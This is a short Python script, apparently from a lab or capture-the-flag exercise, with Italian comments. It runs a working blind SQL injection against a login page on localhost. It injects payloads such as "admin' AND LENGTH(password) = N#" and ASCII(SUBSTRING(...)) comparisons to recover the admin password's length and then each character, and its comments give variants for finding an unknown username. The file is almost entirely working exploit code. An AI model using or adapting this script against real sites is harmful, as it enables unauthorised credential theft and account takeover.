import requests
import string

url = "http://127.0.0.1:9090/login.php"
alphabet = list(string.printable)

iter = 1
while iter <= 100:
	"""
	Se non conosco lo username:
	"username": f"admin' OR 1=1 AND LENGTH(username) = {iter}#",
	In questo modo trovo la lunghezza dello username.
	"""
	data = {
		"submit": 'true',
		"username": f"admin' AND LENGTH(password) = {iter}#",
		"password": "1"
	}

	response = requests.post(url, data=data)

	if "ACCESS GRANTED" in response.text:
		print(f"Length: {iter}\n{response.text}", flush=True)
		break
		
	iter += 1

password = ''
password_length = iter
for iter in range(password_length):
	for i, a in enumerate(alphabet):
		"""
		Se non conosco lo username:
		"username": f"admin' OR 1=1 AND ASCII(SUBSTRING(username, {iter + 1}, 1)) = {ord(a)}#",
		In questo modo trovo lo username.
		"""
		data = {
			"submit": 'true',
			"username": f"admin' AND ASCII(SUBSTRING(password, {iter + 1}, 1)) = {ord(a)}#",
			"password": "1"
		}

		response = requests.post(url, data=data)

		if "ACCESS GRANTED" in response.text:
			print(f"Step {i}: {a}\n{response.text}", flush=True)
			password += a
			break

print(f"Password: {password}")
